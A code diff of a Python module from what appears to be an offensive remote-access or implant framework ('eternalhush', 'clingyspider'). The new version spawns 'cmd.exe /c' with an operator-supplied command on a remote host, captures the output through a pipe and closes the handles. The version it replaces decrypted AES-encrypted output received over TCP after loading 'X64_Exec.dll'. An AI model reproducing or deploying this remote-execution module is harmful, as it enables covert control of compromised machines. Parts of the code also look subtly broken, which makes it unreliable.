@@ -1,26 +1,37 @@
 import eternalhush as eh
-from additional import clingyspider
+from additional.clingyspider import api
+from additional.clingyspider import const
 import os
-
-OUTPUT = {
-    "output_length": eh.SHORT,
-    "output": 4094,
-}
+import time
 
 def main(args):
-    clingyspider.ExecuteModule(os.path.join(FILEDIR, "X64_Exec.dll"), args=args)
-    connection = int(eh.ui.GetEnv("CLSP_CONNECTION"))
-    session_key = bytearray.fromhex(eh.ui.GetEnv("CLSP_KEY"))
-    next_iv = bytearray.fromhex(eh.ui.GetEnv("CLSP_IV"))
+    retn = api.CreateProcess("cmd.exe", "/c "+args.cmd, 0)
+    if not retn:
+        eh.ui.Echo("Failed to create remote process 'cmd.exe /c {}'".format(args.cmd), eh.ECHO_ERROR)
+        return
+    if args.timeout:
+        time.sleep(args.timeout)
+    else:
+        time.sleep(5)
+    read_handle = retn.hread.get(int)
+    write_handle = retn.hwrite.get(int)
+    process_handle = retn.hprocess.get(int)    
+    thread_handle = retn.hthread.get(int)
     
-    encrypted_out = eh.net.TcpRecv(connection, 4096)
+    eh.ui.Echo("Created remote process 'cmd.exe /c {}'".format(args.cmd), eh.ECHO_GOOD)
+    eh.ui.Echo("============CAPTURED OUTPUT=================", eh.ECHO_DEFAULT)
     
-    output = eh.data.Struct(OUTPUT)
-    output.from_bytes(eh.crypto.DecryptAesData(session_key, next_iv, encrypted_out))
-    length = int.from_bytes(output.output_length, "little")
+    text = api.ReadFile(read_handle).decode("cp866", errors="replace")
+    if text == None:
+        eh.ui.Echo(f"Failed to read from remote pipe")
+        return
+    eh.ui.Echo(text, eh.ECHO_DEFAULT)
     
-    text_output = output.output[:length].decode("cp866")
-    eh.ui.Echo(text_output, eh.ECHO_DEFAULT)
+    api.CloseFile(write_handle)
+    api.CloseFile(read_handle)
+    api.CloseFile(thread_handle)
+    api.CloseFile(process_handle)
     
-if __name__ == "__main__":
-    main(sys.argv)
+    
+
+
